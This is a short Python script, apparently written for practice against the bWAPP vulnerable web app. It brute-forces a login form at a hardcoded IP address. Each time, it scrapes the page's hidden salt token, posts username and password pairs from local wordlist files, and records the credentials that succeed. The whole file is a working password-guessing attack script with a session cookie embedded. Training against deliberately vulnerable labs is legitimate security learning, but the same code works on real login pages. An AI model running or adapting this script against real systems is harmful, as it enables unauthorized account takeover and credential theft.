#!/usr/bin/env python
# -*- coding: utf-8 -*-
# @Date    : 2018-09-25 11:49:22
# @Author  : LFish (lazy_fish@aliyun.com)
# @Link    : www.lazyfish.cc
# @Version : $Id$

import requests
from bs4 import BeautifulSoup
import threading

 
headers={
	'Cookie' : 'PHPSESSID=36emk6lmq67q73kgkkrjo26qd4; security_level=1'
}
url = 'http://101.198.181.9/bWAPP/ba_pwd_attacks_2.php'


users_passwds={}
def get_salt(n):

	r = requests.get(url,headers=headers)
	soup = BeautifulSoup(r.text, 'lxml')
	salt = soup.find('input', attrs={'type':'hidden'})['value']

	return get_pass(salt, n)


def get_pass(salt, n):
	
	for passwd in passwds:
		postdata={
			'login':users[n],
			'password':passwd,
			'salt':salt,
			'form':'submit'
		}

		r = requests.post(url,data=postdata, headers=headers)
		soup = BeautifulSoup(r.text, 'lxml')

		if soup.find('font', attrs={'color':'green'}):
			print('[+]'+users[n].ljust(10)+':'+passwd.ljust(10)+'--> \t\t right')
			users_passwds[users[n]] = passwd
		else:
			print('[-]'+users[n].ljust(10)+':'+passwd.ljust(10)+'--> \t\t error')

		salt = soup.find('input', attrs={'type':'hidden'})['value']


users = []
passwds = []

with open('C:/Users/lazy_fish/Desktop/users.txt', 'r') as f:
	users.extend(f.read().split('\n'))
with open('C:/Users/lazy_fish/Desktop/passwds.txt', 'r') as f:
	passwds.extend(f.read().split('\n'))

threads = []

# for i in users:
# 	threads.append(threading.Thread(target=get_salt, args=[users.index(i)]))

# for i in threads:
# 	i.start()

# for i in threads:
# 	i.join()


for i in users:
	get_salt(users.index(i))
